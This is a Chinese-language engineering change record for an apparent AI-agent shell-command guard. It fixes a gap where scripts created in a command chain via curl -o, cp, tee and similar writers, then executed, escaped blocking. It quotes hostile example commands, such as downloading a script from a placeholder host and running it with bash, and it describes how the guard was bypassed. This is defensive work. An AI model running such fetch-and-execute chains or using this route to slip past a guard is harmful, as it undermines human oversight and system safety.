---
id: F20261019wvcp
title: wv 造-执对收编——writerContent 扩 argv 写面（cp/mv/install/ln/tee/curl/wget/dd）+ 链内源内容透传 + 词面证 writeFile 族（M-026d87ff）
summary: delta5 裁决立案（2026-10-14）的 wv 侧收编：writerContent 原只收重定向/echo/printf/cat/tee/heredoc 写，造-执对不识别 cp/curl -o 等 argv 写通道——`curl -o /tmp/g.sh <evil> && bash /tmp/g.sh` 的造段不进配对识别，掉到 fs 缺席证明（eval 时文件未造出=absent）→ 放行 → 运行时造+执行逃逸（固化失败实证 10 红）。收编三件：①argv 写面进造段识别（内容不可知→fail-closed，与 `echo "$X" > f && bash f` 既有机制同语义）②链内源内容透传（cp/mv/install/ln 保内容拷贝追链内源写段递归重建——corpus TS-402d73e5 服务脚本形态守恒的关键）③词面证补 writeFile/appendFile（delta9 观察1 潜伏面收口）。另修 pair 管道段排除的 joiner 语义错位（tee 造-执对形态漏收的真根因）。
change_type: fix
capability_test: tests/frameworks/agent/wv-creator-exec-pair.test.ts（拦截侧 10 + 放行侧 6 + 词面 3 = 19 例，修前 10 红固化）+ guard-touchstone exam/corpus 守恒（放行池零 GAP_DIFF、judge 考试零扰动）+ 全量 399 files 6268 passed + 6 skipped 零失败 + tsc/eslint 零报
risk_and_residual: |
  收编方向=多拦不放（fail-closed），主要风险是误拦扩散——以 corpus 守恒+judge 考试零扰动为验收闸（delta5 裁决原文）。实施中 TS-402d73e5（heredoc 造服务脚本 + cp 透传 + node 执行，真实开发形态）翻转红灯，经「链内源内容透传」修回守恒（内容可判读就不该 fail-closed）。残余面（记档）：①tee/管道流输入内容恒不可知=有意保守（delta5 口径明列「管道输入」为不可重建）②跨命令的外部源内容恒 fail-closed ③cp/mv 多源形态逐源候选已覆盖但链式拷贝深度限 4。
mechanism_budget: |
  新增机制：无。造-执对识别扩面是「造出内容为权威载荷」既有机制（牙2）对 argv 写面的补齐；链内源内容透传是「内容可重建则判读」既有语义（heredoc/echo 重建）在拷贝族的自然延伸；「内容不可知→fail-closed」既有（`>>` 链实测 script-payload-dynamic）。删除机制：无。pair 管道排除 joiner 校准=既有语义内修（注释原例「echo a | tee x 的 tee 才是写方」与实现对齐）。净方向：write-target-evaluator +2 函数（pairPlanFor/chainContentPlan 抽出，复杂度回归阈内）。
created_in_conversation: 7b41e085-5c21-4bd1-adfe-dc3ef051753d
causal_links:
  - M-026d87ff（工单：wv 造-执对收编——writerContent 扩至 cp/curl -o + 求值器写调用词表补 writeFileSync/writeFile）
  - F20261015smrj（delta5 裁决立案原文「验收必带 corpus 守恒 + judge 考试零扰动」；造-执对三态机制本文档扩面；delta9 观察1 词面补记）
  - F20261019gses（单一求值器终态——wv 从影子记账转唯一裁决，本收编的紧迫性随切换上升为红线地雷）
  - F20261015gsub（物理隔离兜底线——残余面记档口径参照）
---

## 问题陈述

造-执对（命令内造脚本再执行）的载荷判读机制（牙2/牙3）以「造出内容为权威载荷」为轴：内容可重建则判读，不可重建则 fail-closed（`echo "$X" > f && bash f` → script-payload-dynamic）。但造段识别只认**重定向写**：

1. **argv 写面整族不进配对识别**：`curl -o /tmp/g.sh <evil> && bash /tmp/g.sh`、`cp /src/g.sh /tmp/g.sh && bash /tmp/g.sh` 等——writerContent 无 redirect 直接返回 null，配对回扫跳过，执行段掉到 fs 缺席证明（eval 时文件尚未造出 → absent → 放行），运行时造+执行逃逸。固化失败实证：**10 个拦截形态全红**（curl/wget/cp/ccp 尾杠/mv/install/tee/dd/ln/良性内容 cp）。
2. **tee 造-执对另有真根因**：pair 管道段排除条件 `segs[j].joiner === "|"` 用的 joiner 语义错位——joiner 挂**入端**（探针实证 `echo pwn | tee x` 的 tee.joiner="|"），排除条件把管道**消费侧**（落盘写方）整个跳过，注释原例「echo a | tee x 的 tee 才是写方」从未被实现。
3. **词面证潜伏面（delta9 观察1）**：write-word-face 词面正则有 writeFileSync 无 writeFile（异步族）——非主仓字面量载荷会被词面证洗白（主仓字面量闸对字面形态已兜住，回归钉实测 writeFileSync/writeFile 字面形态现 BLOCK，潜伏面是构造路径载荷）。

## 设计取舍

**机制判定前置（修法决策树四问）**：①新增机制？否——造-执对识别扩面 + 既有「内容不可知→fail-closed」在 argv 写面的补齐。②删除机制？否。③收窄管辖？否——扩执行覆盖面，不收窄规则管辖域。④既有语义内修？**是**（narrow-fix）：「造出内容为权威载荷、可重建则判读、不可知则 fail-closed」的既有语义在漏收写法上的执行补齐。

- **取舍 1：argv 写面统一 content=null（fail-closed），不猜拷贝/下载内容**——cp/curl -o 的内容在命令形态内不可重建，delta5 口径「内容不可知=dynamic」明列「cp/mv/管道输入」。与 `echo hi >> f && bash f` 既有 fail-closed 同语义。
- **取舍 2（关键，corpus 守恒闸）：链内源内容透传**——cp/mv/install/ln 是**保内容拷贝**：源文件是同命令链内造出的（heredoc/echo 静态内容）则内容透传可判读（TS-402d73e5：heredoc 造服务脚本→cp 透传→node 执行，真实开发形态）。「内容不可知」指的是判读不能，链内可追回的内容判不可知是**过杀**（corpus 放行池翻转实证）。外部源/追不到/超深（链式拷贝限深 4）→ 仍 fail-closed。逆序扫（同路径后写覆盖前写；追加写 content=null 吃到即 fail-closed，保守侧一致）。
- **取舍 3：joiner 语义校准**——排除条件改判「下一段经管道接入」（=本段 stdout 进管道），注释原例两形态（`echo a | tee x` 的 tee 是写方 / `echo x > f | wc` 不是）即刻自洽。既有 pinned 形态零漂移（全量 6268 绿）。
- **已排除路径**：「cp 造-执对一律拦」——翻 TS-402d73e5 违反 corpus 守恒验收（delta5 硬闸）；「tee 也走透传」——管道流内容 delta5 明列为不可重建，维持 fail-closed（有意保守，与 `>>` 同口径）；「扩大词面证到裸 writeFile 之外」——超工单射程，记档残余。

## 影响范围

- 判定语义变化仅限：**argv 写面造段 × 执行段配对**形态（原放行→fail-closed BLOCK）+ **链内透传形态**（内容可判读→按内容判）。非配对的 cp/curl 写目标判定（写主仓=拦）原样（写目标提取 F20261015smrj 通道 b/c 已覆盖，本次零改动）。
- 既有 pinned 形态零漂移：corpus 放行池零 GAP_DIFF、judge 考试零扰动、全量 399 files 6268 passed 零失败。
- write-word-face 词面证补 writeFile/appendFile：词面洗白面收窄（更少放行），字面形态判定不变。

## 验证

- **固化失败（修前）**：回归钉 10 红（造-执对 argv 写面全族）+ 8 绿（放行侧/词面字面形态）〔首轮运行记录〕
- **修后**：同文件 **19/19 绿**（+链内透传守恒钉）；
- **corpus 守恒（delta5 硬闸）**：guard-touchstone exam 放行池/拦截池 **零 GAP_DIFF**（TS-402d73e5 经透传修回）、judge 考试零扰动；
- **全量**：399 files **6268 passed + 6 skipped 零失败**（首跑过）；tsc / eslint 零报；
- 探针证据：joiner 挂入端实证（`echo pwn | tee x && bash x` 三段 joiner= ""/"|"/"&&"）留工作区 debug-joiner-out.txt。
